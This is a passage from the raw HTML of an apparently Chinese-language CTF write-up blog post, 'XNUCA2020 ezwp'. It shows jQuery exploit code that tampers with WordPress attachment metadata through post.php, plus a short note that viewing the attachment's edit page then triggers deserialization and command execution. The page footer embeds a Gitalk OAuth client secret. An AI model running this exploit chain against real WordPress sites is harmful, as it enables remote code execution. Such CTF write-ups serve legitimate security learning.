class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// _wp_attachment_metadata</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editattachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;thumb&quot;</span>:thumb</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>上面的exp执行完成后_wp_attachment_metadata与_wp_attached_file字段就修改完成了。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/7.png"></p>
<p>最后访问页面<code>/wp-admin/media.php?attachment_id=9&amp;action=edit</code>就可以触发反序列化执行命令获取输出。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/6.png"></p>
<h1 id="0x6-Contact-Form-7"><a href="#0x6-Contact-Form-7" class="headerlink" title="0x6 Contact-Form-7"></a>0x6 Contact-Form-7</h1>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/10/26/Signal-CheatSheet/" rel="prev" title="Signal CheatSheet">
      <i class="fa fa-chevron-left"></i> Signal CheatSheet
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/08/10/Register-CheatSheet/" rel="next" title="Register CheatSheet">
      Register CheatSheet <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-WordPress"><span class="nav-number">1.</span> <span class="nav-text">0x0 WordPress</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-Unserialize-POP-Chain"><span class="nav-number">2.</span> <span class="nav-text">0x1 Unserialize POP Chain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Exploit-Chain"><span class="nav-number">3.</span> <span class="nav-text">0x2  Exploit Chain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-wp-attached-file"><span class="nav-number">4.</span> <span class="nav-text">0x3 wp_attached_file</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-wp-attachment-metadata"><span class="nav-number">5.</span> <span class="nav-text">0x4 wp_attachment_metadata</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-Exploit"><span class="nav-number">6.</span> <span class="nav-text">0x5 Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-Contact-Form-7"><span class="nav-number">7.</span> <span class="nav-text">0x6 Contact-Form-7</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Srpopty</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Srpopty</span>
</div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'fb9b672afa74e328fbe8',
      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
      repo        : 'srpopty.github.io',
      owner       : 'Srpopty',
      admin       : ['Srpopty'],
      id          : '3d9f50820fda5cb840d8bae2f50b6020',
        language: 'en',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
